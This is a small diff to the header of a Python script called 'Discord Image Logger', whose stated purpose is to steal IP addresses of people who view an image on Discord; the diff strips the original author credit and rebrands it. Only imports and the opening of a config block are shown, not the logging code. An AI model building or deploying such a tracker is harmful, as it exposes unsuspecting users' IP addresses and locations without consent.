@@ -1,14 +1,13 @@
 # Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "DeKrypt"
+__description__ = "A simple application which allows you to steal IPs"
+__version__ = "tanga"
+__author__ = "sytho"
 
 config = {
     # BASE CONFIG #
